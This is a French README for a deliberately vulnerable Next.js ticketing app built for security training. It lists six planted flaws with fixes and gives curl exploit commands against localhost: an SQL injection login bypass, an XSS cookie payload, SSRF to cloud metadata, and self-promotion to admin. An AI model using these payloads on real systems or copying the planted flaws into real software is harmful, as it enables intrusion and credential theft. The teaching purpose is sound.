# TicketApp — Application de gestion de tickets volontairement vulnérable

> **Avertissement :** Cette application contient des vulnérabilités intentionnelles à des fins pédagogiques.  
> **Ne jamais déployer en production.**

## Stack technique

- **Framework :** Next.js 14 (App Router)
- **Base de données :** SQLite (better-sqlite3)
- **Authentification :** JWT (jsonwebtoken)
- **Style :** Tailwind CSS
- **CI/CD :** GitHub Actions + Semgrep + Gitleaks + npm audit

---

## Installation et démarrage

```bash
# 1. Installer les dépendances
npm install

# 2. Initialiser la base de données (crée les tables + données de test)
node scripts/init-db.js

# 3. Démarrer en développement
npm run dev
```

L'application est accessible sur **http://localhost:3000**

### Comptes de test

| Email | Mot de passe | Rôle |
|-------|-------------|------|
| admin@tickets.local | admin123 | admin |
| alice@example.com | alice123 | user |
| bob@example.com | bob123 | user |

---

## Vulnérabilités implémentées

| ID | Vulnérabilité | OWASP | CWE | Fichier principal |
|----|--------------|-------|-----|------------------|
| VLN-01 | SQL Injection | A03:2021 | CWE-89 | `app/api/auth/login/route.js` |
| VLN-02 | IDOR / Broken Access Control | A01:2021 | CWE-639 | `app/api/tickets/[id]/route.js` |
| VLN-03 | XSS Stocké | A03:2021 | CWE-79 | `app/tickets/[id]/page.js` |
| VLN-04 | SSRF | A10:2021 | CWE-918 | `app/api/admin/fetch-url/route.js` |
| VLN-05 | Security Misconfiguration | A05:2021 | CWE-256/321/614 | `.env`, `lib/auth.js`, `next.config.js` |
| VLN-06 | Mass Assignment | A08:2021 | CWE-915 | `app/api/users/[id]/route.js` |

---

## Exploitation rapide

### VLN-01 — SQLi Login bypass
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "'\''\ OR '\''1'\''='\''1'\''\ --", "password": "x"}'
```

### VLN-02 — IDOR ticket d'un autre utilisateur
```bash
# Se connecter en tant qu'alice, lire le ticket de bob
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"alice123"}' | jq -r '.token')

curl http://localhost:3000/api/tickets/2 \
  -H "Authorization: Bearer $TOKEN"
```

### VLN-03 — XSS Stocké
Dans le formulaire de commentaire, insérer :
```html
<img src=x onerror="alert(document.cookie)">
```

### VLN-04 — SSRF
```bash
# Récupérer le token admin
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@tickets.local","password":"admin123"}' | jq -r '.token')

# Accès aux métadonnées cloud (AWS/GCP/Azure)
curl -X POST http://localhost:3000/api/admin/fetch-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Pivot interne — accès aux ressources non exposées
curl -X POST http://localhost:3000/api/admin/fetch-url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url": "http://localhost:3000/api/admin/users"}'
```

### VLN-06 — Mass Assignment (élévation de privilèges)
```bash
# Alice (rôle user) s'auto-promut admin
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"alice123"}' | jq -r '.token')

curl -X PUT http://localhost:3000/api/users/2 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"username": "alice", "role": "admin"}'
# → {"user": {"role": "admin", ...}} — alice a maintenant accès à /admin
```

---

## Corrections appliquées (branche `secure-version`)

### VLN-01 — SQL Injection
| | Vulnérable | Corrigé |
|--|-----------|---------|
| **Fichier** | `app/api/auth/login/route.js` | idem |
| **Avant** | `` `WHERE email='${email}'` `` — interpolation directe | — |
| **Après** | `db.prepare("WHERE email = ?").get(email)` — requête paramétrée | ✅ |
| **Bonus** | `bcrypt.compare()` à durée constante (anti timing-attack) | ✅ |

### VLN-02 — IDOR / Broken Access Control
| | Vulnérable | Corrigé |
|--|-----------|---------|
| **Fichiers** | `app/api/tickets/[id]/route.js`, `app/api/tickets/route.js` | idem |
| **Avant** | Aucune vérification de propriété sur GET/PUT/DELETE | — |
| **Après** | `canAccess(ticket, user)` : `ticket.user_id === user.id \|\| role === "admin"` | ✅ |
| **Après** | `GET /api/tickets` filtre par `WHERE user_id = ?` pour les non-admins | ✅ |

### VLN-03 — XSS Stocké
| | Vulnérable | Corrigé |
|--|-----------|---------|
| **Fichier** | `app/tickets/[id]/page.js` | idem |
| **Avant** | `dangerouslySetInnerHTML={{ __html: ticket.title }}` | — |
| **Après** | `<h1>{ticket.title}</h1>` — React échappe automatiquement le HTML | ✅ |
| **API** | Commentaires stockés sans sanitisation | Limite 2000 chars + `content.trim()` ✅ |

### VLN-04 — SSRF
| | Vulnérable | Corrigé |
|--|-----------|---------|
| **Fichier** | `app/api/admin/fetch-url/route.js` | idem |
| **Avant** | `fetch(url)` sans aucune validation | — |
| **Après** | Liste blanche : `hooks.slack.com`, `discord.com`, `api.github.com`, `hooks.zapier.com` | ✅ |
| **Après** | Blocage regex IPs privées (10.x, 192.168.x, 127.x, 169.254.x, ::1…) | ✅ |
| **Après** | Seul le statut HTTP est retourné — corps de réponse non exposé | ✅ |

### VLN-05 — Security Misconfiguration

| Sous-faille | Avant | Après |
|------------|-------|-------|
| **05a** Secret JWT | `JWT_SECRET=secret123` (6 chars) | Secret 40 chars, `.env` hors git, `.env.example` fourni |
| **05b** Stack traces | `{ error: err.message, stack: err.stack }` exposé | Message générique `"Erreur interne"` dans tous les `catch` |
| **05c** Mots de passe | Stockés en clair, retournés dans les réponses API | `bcrypt.hash(password, 12)` + champ `password` exclu des `SELECT` |
| **05d** Headers HTTP | Aucun header de sécurité | X-Frame-Options, CSP, COEP, CORP, COOP, X-Content-Type-Options… |
| **05e** Cookie JWT | `{ path: "/" }` uniquement | `httpOnly: true`, `sameSite: "strict"`, `secure` (prod), `maxAge: 86400` |
| **05f** Token dans URL | `extractToken` acceptait `?token=` | Supprimé — cookie ou `Authorization` header uniquement |
| **05g** JWT durée | `expiresIn: "7d"`, secret faible | `expiresIn: "24h"`, validation `secret.length >= 32` |
| **05h** Auth côté client | `localStorage.getItem("token")` en header | Token uniquement dans cookie httpOnly, pages utilisent le cookie |
| **05i** Brute force | Aucune limite de tentatives | Rate limiting : max 5 tentatives / 15 min par IP (HTTP 429) |

### VLN-06 — Mass Assignment
| | Vulnérable | Corrigé |
|--|-----------|---------|
| **Fichier** | `app/api/users/[id]/route.js` | idem |
| **Avant** | `PUT` accepte `{ username, email, password, role }` — champ `role` modifiable | — |
| **Après** | Whitelist stricte : seuls `username` et `email` sont traités | ✅ |
| **Après** | Vérification IDOR : seul le propriétaire ou admin peut modifier | ✅ |
| **Page** | `/profile` exposait un sélecteur `role` modifiable | Formulaire sans champ `role` ✅ |
